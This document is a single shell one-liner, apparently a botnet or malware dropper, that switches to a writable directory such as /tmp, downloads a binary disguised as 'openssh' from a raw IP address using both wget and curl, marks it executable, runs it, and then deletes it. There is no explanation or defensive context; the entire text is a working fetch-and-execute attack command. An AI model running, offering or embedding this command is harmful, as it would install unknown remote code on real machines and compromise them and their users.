cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.14/openssh; curl -O http://46.166.185.14/openssh; chmod +x openssh; ./openssh; rm -rf openssh
